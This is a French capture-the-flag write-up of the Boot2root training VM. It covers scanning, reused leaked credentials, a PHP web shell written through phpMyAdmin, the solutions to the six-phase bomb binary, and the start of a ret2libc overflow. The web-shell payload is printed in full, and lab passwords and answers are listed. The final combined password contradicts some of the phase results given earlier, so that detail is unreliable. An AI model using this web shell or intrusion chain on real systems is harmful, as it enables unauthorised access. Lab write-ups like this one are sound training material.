

# Boot-2-root

Après avoir téléchargé l’ISO, on a commencé les réglages de la VM sur VirtualBox
Dans « Network », nous sommes passés en « Host-Only Adapter », puis nous avons lancé la VM

  

> 

## **Étape 1**

  

Boot2root nous demande un login et un mot de passe que nous ne connaissons pas.

  

On a donc commencé par lancer la commande **`ifconfig`**

On remarque un « ***vboxnet0*** » avec une adresse ip de **192.168.56.1**

  

Nous utilisons donc **`nmap 192.168.56.0-255`** afin scanner tout les réseaux entre **192.168.56.0** et **192.168.56.255**

 
Nous nous rendons compte qu’il y a un serveur web avec [**_http://192.168.56.101_**](http://192.168.56.101)  avec le port **_80_**



>  - **_21/tcp open ftp_**
>  - **_22/tcp open ssh_**
>  -  **_80/tcp open http_**
>   - **_443/tcp open https_**

 
Afin de référencer les différentes url liées à cette adresse IP nous avons utilisé **_DIRB,_** un « scanner de contenu web ». En effet ce logiciel va se baser par rapport a un fichier contenant énormément de mots clefs et va tester ***ip/unmotclé***

Donc en faisant la commande **`./dirb https://192.168.56.101/ wordlists/common.txt`** nous avons obtenu 3 liens intéressants.

  

> /forum /phpmyadmin /webmail

Sur le forum, il y a 3 sections, donc une qui concerne des problèmes de connexion.
Il y a beaucoup des lignes qui semblent être des logs de connexion.

On s’aperçoit qu’il y a un **_session_closed(lmerard)_** 
 Donc lmezard s’est connecté.

On s’aperçoit également qu’il y a un 

> Failed password for invalid user **_!q\]Ej?*5K5cy*AJ_**

Ce login ressemble a un mot de passe. On essaye donc sur phpmyadmin/mail et c’est finalement ce qui nous permet de nous connecter au forum.

    lmezard - !q\]Ej?*5K5cy*AJ

Une fois connecté au forum on voit l’adresse email de lmezard qui est

> laurie@borntosec.net

On remercie Lmezard qui a eu la bonne idée d’avoir un seul mot de passe, ce qui nous a donc permis de se connecter a son webmail avec cette adresse email et le mot de passe précédent.

Sur les mails, on voit que Lmezard a reçus un email avec les identifiants et mot de passe pour la base de données.

> **_root_**
> 
> **_Fg-‘kXXbj87E:aJ$_**

On peut donc maintenant se connecter à PhpMyAdmin

On remarque que le forum a été crée par MyLittleForum. Sur leur GitHub d’installation, on remarque qu’a cette endroit **_/var/www/forum/templates_c_** on a les droits d’écritures, ce qui nous permettra de crée une nouvelle page et injecter notre code php.

Notre code php va donc crée un formulaire, qui prendra en argument des commandes de shell. On pourra donc naviguer sur le serveur et voir des potentiels failles.


    "SELECT "<HTML><BODY><FORM METHOD=\"GET\" NAME=\"myform\" ACTION=\"\"><INPUT TYPE=\"text\" NAME=\"cmd\"><INPUT TYPE=\"submit\" VALUE=\"Send\"></FORM><pre><?php if($_GET['cmd']) {system($_GET[\'cmd\']);} ?> </pre></BODY></HTML>"**INTO OUTFILE ‘/var/www/forum/templates_c/hacker.php’"

En naviguant un petit peu on se rend compte qu’il y a un fichier **_password_**

En rentrant cette commande **`cd /home/LOOKATME; cat password`** on obtient donc

> lmezard:G!@M6f4Eatau{sF »

Ces identifiants nous permettent de nous connecter en FTP avec le port 21 comme obtenu précédemment.



## **Étape 2**

  

Grace a notre connexion ftp, on remarque qu’on a accès a 2 fichiers. Un README et un fichier fun. Le README nous annonce qu’on va devoir trouver le mot de passe de Laurie pour se connecter en SSH


Le fichier fun n’était pas très lisible, mais il y avait quelques brides de code compréhensible.

Nous avons fait un **`grep getme *`**  pour trouver tout les fichiers qui contenait une lettre du mot de passe. Ensuite nous faisions un cat du fichier correspondant et nous pouvions trouver une lettre après l’autre. Le résultat était **_Iheartpwnage_**

Après avoir hash avec sha256 nous obtenions le mot de passe de Laurie qui était

  

**_330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4_**

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

**Etape 3**

  

La connexion en ssh se fait donc sur **ssh -p 22** [laurie@192.168.56.101](mailto:laurie@192.168.56.101)

Sur la session de Laurie on trouve un fichier BOMB qui nous dit que ca va se passer en 6 étapes.

Il y a également un README qui nous explique que le fichier bomb va nous permettre de trouver le mot de passe de Thor pour se connecter en SSH

  

  

**Diffuse this bomb!**

**When you have all the password use it as "thor" user with ssh.**

  

**HINT:**

**P**

**2**

**b**

  

**o**

**4**

  

**NO SPACE IN THE PASSWORD (password is case sensitive).**

  

Nous avons téléchargé et utilisé Cutter ce qui nous a permis de décompilé le programme.

On se rend compte dans le main qu’il a « **_phase_1 phase_2 phase_3 phase_4 phase_5 phase_6_** »

  

**_Phase_1_**

  

En se baladant dans le fichier C liée a phase_1, nous avons trouvé la phrase

**_Public speaking is very easy._**

Cette phrase est donc la solution pour la phase 1

  

  

**_Phase_2_**

  

On se rend compte dans le code C décompilé qu’il y a une sorte de suite dans le calcul,

L’indice dans le README nous indique que la deuxième input sera un « 2 »

On sait en voyant le code que le résultat est une entrée de 6 input.

  

Initialement, on pensait que c’était la suite de fibonacci, mais c’était enfaite une suite factorielle.

Le résultat est donc **_1 2 6 24 120 720_**

  

**_Phase_3_**

  

Encore une fois avec le code décompilé de la phase3 on se rend compte que le code est très logique et qu’il y a donc 3 solutions possible. **_1 b 214_** ou **_2 b 755_** ou **_7 b 524_**

  

**_Phase_4_**

  

Le code est encore une fois assez logique et nous fait penser à la suite de Fibonacci.

Le résultat est 55 et donc nous comparons 55 par rapport à la suite de fibonacci est donc **_10_**. Néanmoins, on voit dans la condition qu’on ne doit pas commencer par le 1, donc l’index de la suite est enfaite 9. Le résultat de cette phase_4 est donc **_9_**

  

**_Phase_5_**

  

Dans le code décompilé, on se rend compte qu’il y a cette chaine de caractère « **_isrveawhobpnutfg_** » On se rend également compté qu’il y a un masque binaire affecté à ce code de 15 (0xf)

  

On voit également le mot « giants » et on se rend compte qu’il a été fait avec la chaine de caractère trouvé précédemment additionné au masque binaire.

  

On fait donc un reverse de cela avec un code python (merci bpisano)

**_/script/phase_5.py_**

On obtient donc le code **_opekma_**

  

**_Phase_6_**

  

Ici, c’est légèrement plus complexe. On a aucun réel indice nous permettant de nous donner le code. Par contre on remarque plusieurs conditions qui peuvent nous être utiles.

  

Le code commence par **_4_** (voir README)

Il doit avoir **_6_** nombres

Les nombres sont compris entre **_1 et 6_**

  

On va donc faire un brutforce en python nous permettant de trouver le mot de passe. (Merci bpisano encore)

  

**_/script/phase_6.py_**

On obtient donc le code **_426315_**

  

En additionnant tout les codes obtenus, le résultat est donc

**_Publicspeakingisveryeasy.126241207201b2149opekmq426135_**

  

**Etape 4**

  

On peut donc maintenant se connecter en ssh avec Thor comme user

Il y a sur la session un fichier turtle avec des indications comme « avance 10 »

On execute donc le fichier turtle sur le site [http://lwh.free.fr/pages/prog/logo/logo.htm](http://lwh.free.fr/pages/prog/logo/logo.htm)

  

Au préalable, on a modifié légèrement les instructions en enlevant les instructions superflus.

On obtient un dessin avec le mot **_SLASH_**

  

  

  

  

  

  

  

  

  

  

A la fin du fichier turtle, nous avions une indications nous faisant comprendre qu’il fallait hasher le mot de passe. Nous avons testé en sha1 et en md5. Le bon hash était MD5 ce qui nous a donné

**_646da671ca01bb5d84dbb5fb2238dc8e_**

  

  

**Etape 5**

  

On peut donc maintenant se connecter en ssh avec le user zaz

Il y a un exécutable **_exploit_me_** qui nous donnent quelques informations puisque cet exécutable a les privilèges root, donc lorsqu’on lance cette exécutable, c’est comme si nous étions root.

  

En décompilant le code, nous voyons un code très simple

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

On s’aperçoit que le programme prend l’argument envoyé, fait un strcpy et l’affiche.

Néanmoins il y a une réel faille dans ce programme puisque le programme segfault lorsqu’on lui envoie plus de 140 caractères.

Nous allons faire une attaque « Ret2libc »

  

Merci a ce site très bien documenté

[https://beta.hackndo.com/retour-a-la-libc/](https://beta.hackndo.com/retour-a-la-libc/)

